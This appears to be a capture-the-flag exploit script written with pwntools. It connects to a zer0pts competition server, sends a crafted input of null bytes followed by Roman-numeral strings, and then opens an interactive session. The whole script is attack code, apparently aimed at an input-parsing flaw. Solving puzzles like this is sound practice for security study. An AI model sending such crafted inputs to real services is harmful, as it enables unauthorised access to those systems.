#!python3
from pwn import *
#connect pwn1.ctf.zer0pts.com 9000
r = remote('pwn1.ctf.zer0pts.com', 9000)
print(r.recvuntil(b'ind:').decode())
r.sendline(b'\x00'*6+b'MMMMMCXXXXXXIIII')
r.sendline(b'MMMMCCCCCCCCXXXXXIIII')
r.interactive()